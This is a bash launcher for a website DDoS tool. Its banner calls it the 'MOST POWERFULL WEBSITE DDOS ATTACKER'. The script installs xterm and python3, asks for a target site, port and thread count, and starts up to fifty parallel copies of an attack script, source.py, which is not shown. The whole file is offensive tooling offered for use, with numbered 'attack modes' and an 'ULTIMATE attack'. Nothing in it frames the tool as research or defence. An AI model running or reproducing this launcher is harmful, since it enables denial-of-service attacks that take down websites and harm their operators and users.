white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"

echo -e "$Cafe##############################################################################$nc"
echo -e "$Cafe##   \e[31m▄▄      ▄▄  \e[5mrazvan   ▄▄        ▄▄▄▄▄       ▄▄▄▄     $Cafe                   ##"
echo -e "$Cafe##   ██      ██           ██        ██▀▀▀██    ██▀▀██                  $Cafe     ##"
echo -e "$Cafe##   \e[31m▀█▄ ██ ▄█▀  ▄████▄   ██▄███▄   ██    ██  ██    ██  ▄▄█████▄   $Cafe         ##"
echo -e "$Cafe##   ██ ██ ██  ██▄▄▄▄██  ██▀  ▀██  ██    ██  ██    ██  ██▄▄▄▄ ▀   $Cafe          ##"
echo -e "$Cafe##   \e[31m ███▀▀███  ██▀▀▀▀▀▀  ██    ██  ██    ██  ██    ██   ▀▀▀▀██▄$Cafe            ##"
echo -e "$Cafe##    ███  ███  ▀██▄▄▄▄█  ███▄▄██▀  ██▄▄▄██    ██▄▄██   █▄▄▄▄▄██         $Cafe   ##" 
echo -e  "$Cafe##   \e[31m▀▀▀  ▀▀▀    ▀▀▀▀▀   ▀▀ ▀▀▀    ▀▀▀▀▀       ▀▀▀▀     ▀▀▀▀▀▀      $Cafe        ##"
echo -e "$Cafe##############################################################################$nc"
echo -e "##$red---MOST POWERFULL WEBSITE DDOS ATTACKER--BY SURYA$nc /Remastered by RAZVAN   ##"
echo -e "$Cafe##############################################################################$nc"
echo -e "$cyan Author :-Razvan Iacob $nc"




                                                                                
if xterm -version &>/dev/null; then
    echo -e "$purple xterm is installed on your device $nc"
else
echo -e "\e[94mINSTALLING XTERM.......\e[0m"
progressbar()
{
    bar="##################################################"
    barlength=${#bar}
    n=$(($1*barlength/100))
    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
}


pid=$!

apt-get install xterm > /dev/null

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done 
# kill the spinner task
kill $pid > /dev/null 2>&1
echo $'\n*\n*\n\e[97mXTERM Successfully Installed on Your Device\e[0m'
fi  
if command -v python3 &>/dev/null; then
    echo -e "$purple Python 3 is installed on your device $nc"
else

echo -e "\e[94mINSTALLING PYTHON3.......\e[0m"
progressbar()
{
    bar="##################################################"
    barlength=${#bar}
    n=$(($1*barlength/100))
    printf "\r[%-${barlength}s (%d%%)] " "${bar:0:n}" "$1" 
}


pid=$!

apt-get install python3 > /dev/null

for i in `seq 1 100`;
do
    progressbar $i
    sleep 0.1
done  
# kill the spinner task
kill $pid > /dev/null 2>&1 
echo $'\n*\n*\n\e[97mPython3 Successfully Installed on Your Device\e[0m'
fi
read -p $'\033[0;37mYour WEBSITE :\e[0m     :- ' web
read -p $'\033[0;37mYour  PORT :  \e[0m     :- ' port
read -p $'\033[0;37mEnterTheThread[133]\e[0m:- ' thread

echo "##################################################################"
echo -e "#$red NO.$nc|$red   MODE $nc                                                   #"
echo "##################################################################"
echo -e "#$yellow 1 :Single DDOS Attack  ###############################         $nc#"
echo -e "#$yellow 2 :Double DDOS Attack                                          $nc#" 
echo -e "#$yellow 3 :Triple DDOS Attack $nc $red DDDD  DDDD                             $nc#"
echo -e "#$yellow 4 :Four   DDOS attack $nc $red D   D D   D       SSSS                 $nc#"
echo -e "#$yellow 5 :Five   DDos attack $nc $red D   D D   D  OOO  S                    $nc#"
echo -e "#$yellow 6 :Six    DDOS attack $nc $red D   D D   D O   O SSSS                 $nc#"
echo -e "#$yellow 7 :Seven  DDOS attack $nc $red D   D D   D O   O    S                 $nc#"
echo -e "#$yellow 8 :Eight  DDOS attack $nc $red DDDD  DDDD   OOO  SSSS                 $nc#"
echo -e "#$yellow 9 :Nine   DDOS attack                                          $nc#"
echo -e "#$yellow 10:Ten    DDOS attack $nc $green     REMASTERED                $nc#" 
echo -e "#$yellow 11:Eleven DDOS attack                                          $nc#"
echo -e "#$yellow 12:Twelve DDOS attack     ##########################           $nc#" 
echo -e "#$yellow 13:Thirteen DDOS attack   ##########################           $nc#" 
echo -e "#$yellow 14:Fourteen DDOS attack   ##########################           $nc#"
echo -e "#$yellow 15:Fifteen  DDOS attack   ##########################           $nc#" 
echo -e "#$yellow 16:Sixteen  DDOS attack   ##########################           $nc#" 
echo -e "#$yellow 17:SeventeenDDOS attack   ##########################           $nc#" 
echo -e "#$yellow 18:Eighteen DDOS attack   ##########################           $nc#"
echo -e "#$yellow 19:Nineteen DDOS attack   ##########################           $nc#"
echo -e "#$yellow 20:TwentiethDDOS attack                                        $nc#"
echo -e "#$green  21:ULTIMATE attack $red !!!MAKE SURE YOU HAVE A POWERFULL PC!!!$nc#"
echo "##################################################################"
echo -e "---------------------------"
read -p "ENTER MODE NUMBER ⤴  :- " SA



if [ $SA = 1 ]; then
xterm -e python3 source.py -s $web -p $port -t $thread &
fi

if [ $SA = 2 ]; then
for i in {1..2}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done


fi
if [ $SA = 3 ]; then
for i in {1..3}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 4 ]; then
for i in {1..4}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi
if [ $SA = 5 ]; then
for i in {1..5}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi
if [ $SA = 6 ]; then
for i in {1..6}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 7 ]; then
for i in {1..7}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 8 ]; then
for i in {1..8}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 9 ]; then
for i in {1..9}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 10 ]; then
for i in {1..10}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi 

if [ $SA = 11 ]; then
for i in {1..11}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi 

if [ $SA = 12 ]; then
for i in {1..12}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi
 

if [ $SA = 13 ]; then
for i in {1..13}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 14 ]; then
for i in {1..14}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi 

if [ $SA = 15 ]; then
for i in {1..15}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi  

if [ $SA = 16 ]; then
for i in {1..16}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi 

if [ $SA = 17 ]; then
for i in {1..17}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi 

if [ $SA = 18 ]; then
for i in {1..18}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi
 

if [ $SA = 19 ]; then
for i in {1..19}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi

if [ $SA = 20 ]; then
for i in {1..20}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi  

if [ $SA = 21 ]; then
for i in {1..50}
do xterm -e python3 source.py -s $web -p $port -t $thread &
done
fi 


echo "$red DDOS REMASTERED VERSION CLOSED $nc"




